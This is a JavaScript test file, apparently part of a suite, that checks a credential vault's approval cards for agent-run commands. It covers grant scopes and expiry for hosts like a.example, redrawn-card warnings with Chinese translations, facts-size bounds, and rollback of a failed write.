  const card0 = await cardAfter(w, b0), c = card0 && JSON.parse(JSON.stringify(card0)), tray = drawnHtml(c), pane = drawnHtml(c, undefined, { buttons: false }), zhTray = drawnHtml(c, tFor(ZH));
  const v = c && FA.runCardOf(c, {});
  ok(!!(c && c.action.always === true && !c.action.command && v && v.changes && v.changes.lines.length === 1 && v.changes.lines[0].map((x) => x.text).join('') === LINE && !v.always.hint), '㉗a the model: a hosts «Always» over a.example (held, no end) + c.example has ONE change line on the card\'s own row (`changes`) — «holds a.example with no end — this replaces that grant: a.example is then held for 30 days.» — never only in the hint (which a hosts «Always» does not show)', { changes: v && v.changes, hint: v && v.always.hint });
  ok(changeRowIn(tray) === LINE && /data-answer="always"/.test(tray) && tray.indexOf('ut-run-changes') > 0 && tray.indexOf('ut-run-changes') < tray.indexOf('ut-run-answer') && !/ut-run-hint/.test(tray), '㉗b the tray / chat row (and the phone — the same row): the line on its OWN row ABOVE the three answers, the hosts «Always» among them (no hint beside it)', { row: changeRowIn(tray), tray: textOf(tray).slice(0, 400) });
  ok(changeRowIn(pane) === LINE && !/data-answer=/.test(pane), '㉗c the For-you window\'s pane (its answers are the window\'s action row) draws the same line', { row: changeRowIn(pane) });
  ok(changeRowIn(zhTray) === '这个对话持有 a.example，不设期限 — 这会替换那个授权：之后 a.example 为期 30 天。', '㉗d in 中文: «这个对话持有 a.example，不设期限 — 这会替换那个授权：之后 a.example 为期 30 天。»', { row: changeRowIn(zhTray) });
  if (c) w.door.answer(c.action.askId, { answer: 'deny' }); await p0;
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  w2.useGrants.addMember(w2.e.id, X, { hosts: ['a.example'], until: Date.now() + 8 * 3600e3, source: 'owner' });   // 8 hours, the owner's Save
  const r2 = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://a.example/x', 'https://c.example/y'), { answer: 'always', reauthed: true });
  const row2 = changeRowOf(r2.drawn);
  const m2 = memberOf(w2);
  ok(/^This conversation holds a\.example until .+ — this replaces that grant: a\.example is then held for 30 days\.$/.test(String(row2)) && r2.a && r2.a.ok && endOfScope(m2, 'a.example') > Date.now() + 29 * DAY, '㉗e an 8-hour scope the press STRETCHES to 30 days says so on the face the same way («holds a.example until … — this replaces that grant: … for 30 days») — and the press does exactly that', { row2, m2 });
  const w3 = await world();
  w3.door.setRunnable({ id: w3.e.id, on: true, reauthed: true });
  const b3 = new Set(cardsOf(w3).map((x) => x.id));
  const p3 = w3.door.run({ caller: w3.caller(), args: RUN(w3.e.ref, 'curl', 'https://c.example/y'), cwd: w3.work });
  const c3 = await cardAfter(w3, b3), d3 = c3 && JSON.parse(JSON.stringify(c3));
  ok(!!(d3 && changeRowOf(d3) === null && /data-answer="always"/.test(drawnHtml(d3))), '㉗f (unchanged) a hosts «Always» that only ADDS draws no change row', { row: d3 && changeRowOf(d3) });
  if (c3) w3.door.answer(c3.action.askId, { answer: 'deny' }); await p3;
});

console.log('㉘ (r5, MAJOR) A CARD THE PRESS DREW AGAIN IS MARKED — never the old face (its change row and its prose say «Drawn again at …»)');
await leg('㉘ the redrawn card differs', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const b0 = new Set(cardsOf(w).map((c) => c.id));
  const pA = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://a.example/x'), cwd: w.work });
  const cA = await cardAfter(w, b0); b0.add(cA && cA.id);
  const pB = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', '-s', 'https://a.example/y'), cwd: w.work });
  const cB = await cardAfter(w, b0);
  const face0 = cB && drawnHtml(JSON.parse(JSON.stringify(cB)));
  const aA = cA && w.door.answer(cA.action.askId, { answer: 'always', reauthed: true });
  await sleep(5);
  const aB1 = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
  const it = cB && openOf(w, 'vault-run-ask').find((i) => i.id === cB.id);
  const face1 = it && drawnHtml(it), row1 = changeRowIn(face1), zh1 = it && changeRowOf(it, tFor(ZH));
  ok(!!(aA && aA.ok && aB1 && aB1.code === 'ask_redrawn' && changeRowIn(face0) === null && face1 !== face0 && /^Drawn again at \S+: what this answer writes changed since the card was first shown — read it again\.\nThis conversation holds a\.example until .+ — this replaces that grant: a\.example is then held for 30 days\.$/.test(String(row1))), '㉘a the card drawn again is NOT the old face: its own row now says «Drawn again at HH:MM: what this answer writes changed since the card was first shown — read it again.» and the line of now (the first face had no row at all)', { row1, aB1 });
  ok(/^已于 \S+ 重新绘制：这个回答要写入的内容与卡片最初显示时不同 — 请重新阅读。/.test(String(zh1)) && !!it && /^Drawn again at \S+: what this answer writes changed/.test(String(it.detail)) && !!(it.facts && it.facts.redrawn && it.facts.redrawn.at > 0), '㉘b … in 中文 «已于 HH:MM 重新绘制：…请重新阅读。», and the prose (an older client; THE BELT\'s text) says it first; the facts carry the mark (`redrawn.at`)', { zh1, detail: it && String(it.detail).slice(0, 160) });
  const aB2 = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
  await pA; await pB;
  ok(!!(aB2 && aB2.ok), '㉘c … and the marked card\'s next press writes (the belt reads the marked text)', aB2);
  const w3 = await world();
  w3.door.setRunnable({ id: w3.e.id, on: true, reauthed: true });
  const q = await w3.door.request({ caller: w3.caller(), entry: w3.e.ref, purpose: 'call c', standing: true, hosts: ['c.example'], cwd: w3.work });
  const sc0 = openOf(w3, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId), sface0 = sc0 && drawnHtml(JSON.parse(JSON.stringify(sc0)));
  const rc = await runAnswered(w3, RUN(w3.e.ref, 'curl', 'https://c.example/v'), { answer: 'always', reauthed: true });
  const y1 = q && q.askId && w3.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const sc = openOf(w3, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId), sface1 = sc && drawnHtml(sc);
  const y2 = q && q.askId && w3.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  ok(!!(rc.a && rc.a.ok && y1 && y1.code === 'ask_redrawn' && changeRowIn(sface0) === null && /^Drawn again at \S+: what this answer writes changed/.test(String(changeRowIn(sface1))) && /^Drawn again at /.test(String(sc && sc.detail)) && ((sc && sc.i18n && sc.i18n.detail) || [])[0] && sc.i18n.detail[0].key.startsWith('Drawn again at {time}') && y2 && y2.ok), '㉘d the standing card drawn again carries the mark too (its own row, its prose and its i18n lines first) — its change line stays its «直到» row; the next Allow writes', { y1, y2, row: changeRowIn(sface1) });
});

console.log('㉙ (r5, MINOR 1) A LATE CARD DESCRIBES NO «ALWAYS» — no «Always (this command)» words beside Allow once / Deny; the base\'s «No «Always»: why» is back');
await leg('㉙ late card words', async () => {
  const fast = { set: (fn, ms) => setTimeout(fn, ms === VR.ASK_TTL_MS ? 60 : ms), clear: (h) => clearTimeout(h) };
  const w = await world({ timers: fast });
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const x = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'part01.mp3'), { leave: true });
  await sleep(120);
  const late = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-run-ask' && i.action.late);
  const live0 = drawnHtml(x.drawn), face = late && drawnHtml(late), v = late && FA.runCardOf(late, {});
  const WHY = 'No «Always»: where it sends what it reads is unknown';
  ok(/data-answer="always"/.test(live0) && textOf(live0).includes('means you trust this command itself'), '㉙a (control) the card while it could be answered offers «Always (this command)» and says what it means', textOf(live0).slice(0, 300));
  ok(!!(late && face && !/data-answer="always"/.test(face) && /data-answer="once"/.test(face) && /data-answer="deny"/.test(face) && !textOf(face).includes('Always (this command)') && !textOf(face).includes('means you trust this command itself') && textOf(face).includes(WHY) && v && v.always.offered === false && JSON.stringify(v.always.hint).includes('No «Always»')), '㉙b the LATE card (Allow once / Deny) says nothing of an «Always (this command)» it no longer has — and keeps the base\'s «No «Always»: where it sends what it reads is unknown»', { hint: v && v.always.hint, face: textOf(face).slice(0, 400) });
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w2 = await world({ timers: fast });
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  w2.useGrants.addMember(w2.e.id, X, { hosts: ['a.example'], source: 'request' });
  const y = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://a.example/x', 'https://c.example/y'), { leave: true });
  await sleep(120);
  const late2 = (w2.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-run-ask' && i.action.late);
  ok(!!(changeRowOf(y.drawn) && late2 && changeRowOf(late2) === null && changeRowOf(late2, undefined, { buttons: false }) === null), '㉙c a late HOSTS card draws no change row either (its «Always» is gone — nothing it said would be written)', { live: changeRowOf(y.drawn), late: late2 && changeRowOf(late2) });
});

console.log('㉚ (r5, MINOR 2) «AS EACH HAS IT NOW» — a newly typed host takes the member\'s EARLIEST live end; with none live, the picker\'s default — said before Save');
await leg('㉚ the Save\'s new-host end', async () => {
  const S = VUR && typeof VUR.saveScopesOf === 'function' ? VUR.saveScopesOf : null;
  const now = Date.now(), D5 = now + 5 * DAY;
  const host = (h, until, expired = false) => ({ kind: 'host', host: h, until, ...(expired ? { expired: true } : {}) });
  const endIn = (r, h) => { const s = r && r.scopes.find((x) => x.host === h); return s ? (s.until || null) : undefined; };
  const r1 = S && S({ was: { scopes: [host('a.example', null), host('b.example', D5)] }, hosts: ['a.example', 'b.example', 'c.example'], endId: 'keep', now });
  ok(!!(r1 && endIn(r1, 'c.example') === D5 && endIn(r1, 'a.example') === null && endIn(r1, 'b.example') === D5 && JSON.stringify(r1.fresh) === '[2]'), '㉚a a member holding a.example (no end) and b.example (5 days): c.example typed new under «As each has it now» takes b.example\'s 5 days — the EARLIEST live end — never no end because a.example has none; a and b keep their own', r1);
  const r2 = S && S({ was: { scopes: [host('a.example', null), host('b.example', null)] }, hosts: ['a.example', 'b.example', 'c.example'], endId: 'keep', now });
  ok(!!(r2 && endIn(r2, 'c.example') === null), '㉚b none only when EVERY live scope has none', r2);
  const r3 = S && S({ was: { scopes: [host('a.example', now - DAY, true), host('b.example', now - 2 * DAY, true)] }, hosts: ['a.example', 'b.example', 'c.example'], endId: 'keep', now });
  ok(!!(r3 && endIn(r3, 'c.example') === now + 30 * DAY && endIn(r3, 'a.example') === now - DAY && endIn(r3, 'b.example') === now - 2 * DAY), '㉚c every scope ENDED (no «now» to keep): c.example takes the picker\'s default, 30 days — never no end; the ended ones stay ended (history)', r3);
  const r4 = S && S({ was: null, hosts: ['c.example'], endId: 'keep', now }), r5 = S && S({ was: { scopes: [host('a.example', null)] }, hosts: ['a.example', 'c.example'], endId: '8h', now });
  ok(!!(r4 && endIn(r4, 'c.example') === now + 30 * DAY && r5 && endIn(r5, 'a.example') === now + 8 * 3600e3 && endIn(r5, 'c.example') === now + 8 * 3600e3), '㉚d a member new to the row the same (30 days); an explicit choice («8 hours») gives every scope that end', { r4, r5 });
  const src = fs.readFileSync(path.join(REPO, 'src/lib/vault-use-row.js'), 'utf8');
  ok(/const plan = saveScopesOf\(\{ was, hosts: h, cmds, endId: endSel\.value \}\)/.test(src) && /const plan = planOf\(\);/.test(src) && /t\('What Save writes:'\)/.test(src) && /hostsIn\.addEventListener\('input', drawPreview\)/.test(src), '㉚e the dialog\'s Save AND its «What Save writes:» line (redrawn as the hosts, the end or who change) both go through saveScopesOf — the end a new host gets is on the screen before Save');
});

console.log('㉛ (r5, TO VERIFY) A REDRAW GOES THROUGH THE FOR-YOU STORE\'S OWN BOUND — a card filed as the «too large» stub stays the stub, never the raw bytes on disk');
await leg('㉛ the redraw\'s facts bound', async () => {
  const MARK = 'PADMARK' + crypto.randomBytes(6).toString('hex');
  const orig = VR.cardFactsOf;
  VR.cardFactsOf = (...a) => { const f = orig(...a); if (JSON.stringify((a[0] && a[0].argv) || []).includes('X-Big')) f.pad = Array.from({ length: 16 }, () => MARK + 'P'.repeat(1900)); return f; };   // a producer's facts past 24 KB (the door's own bound on a facts string is 2 000 — a long fold list)
  try {
    const w = await world();
    w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
    const b0 = new Set(cardsOf(w).map((c) => c.id));
    const pA = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://a.example/x'), cwd: w.work });
    const cA = await cardAfter(w, b0); b0.add(cA && cA.id);
    const pB = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', '-H', 'X-Big: 1', 'https://a.example/y'), cwd: w.work });
    const cB = await cardAfter(w, b0);
    const filed = cB && JSON.parse(JSON.stringify(cB.facts || null));
    const aA = cA && w.door.answer(cA.action.askId, { answer: 'always', reauthed: true });
    await sleep(5);
    const aB = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
    const it = cB && w.userTodos.get(cB.id);
    w.userTodos.flush();
    const disk = fs.readFileSync(path.join(w.dataDir, 'user-todos.json'), 'utf8');
    ok(!!(filed && filed.dropped === 'too-large' && aA && aA.ok && aB && aB.code === 'ask_redrawn' && it && it.status === 'open' && it.facts && it.facts.dropped === 'too-large' && it.facts.v === undefined && !disk.includes(MARK)), '㉛ a run card whose facts passed 24 KB was filed as the stub; the press that drew it again (ask_redrawn) files the stub AGAIN through the store\'s own bound — the raw facts never reach the item, a client or data/user-todos.json', { filed, facts: it && JSON.stringify(it.facts).slice(0, 160), onDisk: disk.includes(MARK) });
    if (cB) w.door.answer(cB.action.askId, { answer: 'deny' });
    await pA; await pB;
  } finally { VR.cardFactsOf = orig; }
});

console.log('㉜ (r5, the acceptance\'s press probe C3) A WRITE THAT THROWS MID-PRESS IS RESTORED LIKE ANY FAILED ONE — named, never a half-write');
await leg('㉜ a throw mid-press', async () => {
  const w = await world();
  const E2 = entryOf(w, 'Upload key');
  for (const id of [w.e.id, E2.id]) w.door.setRunnable({ id, on: true, reauthed: true });
  const row0 = JSON.stringify(((w.grants.rowsFor('vault-use', w.e.id)[0] || {}).to || []).map((m) => viewOf(m)));
  const orig = w.useGrants.addMember;
  w.useGrants.addMember = (id, ...a) => { if (id === E2.id) throw new Error('a planted throw on the second entry'); return orig.call(w.useGrants, id, ...a); };
  let r = null;
  try { r = await runAnswered(w, ['--env', `T=${w.e.ref}`, '--env', `U=${E2.ref}`, '--', 'curl', 'https://new.example/v1'], { answer: 'always', reauthed: true }); } finally { w.useGrants.addMember = orig; }
  const row1 = JSON.stringify(((w.grants.rowsFor('vault-use', w.e.id)[0] || {}).to || []).map((m) => viewOf(m)));
  const vE1 = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['new.example'], destinationKnown: true });
  ok(!!(r && r.a && r.a.ok === false && r.a.code === 'not_written' && row1 === row0 && vE1 && !vE1.ok && w.logs.some((l) => /a press's write for .* threw/.test(l))), '㉜ the second entry\'s write THROWS: the press answers `not_written` (never a throw out of the door), the first entry\'s row is exactly as before (new.example not admitted), and the hub\'s log names it', { a: r && r.a, row0, row1, vE1: vE1 && vE1.code });
});

console.log(`\n${fail ? 'FAILED' : 'ALL PASS'} (${pass} passed, ${fail} failed)`);
process.exit(fail ? 1 : 0);
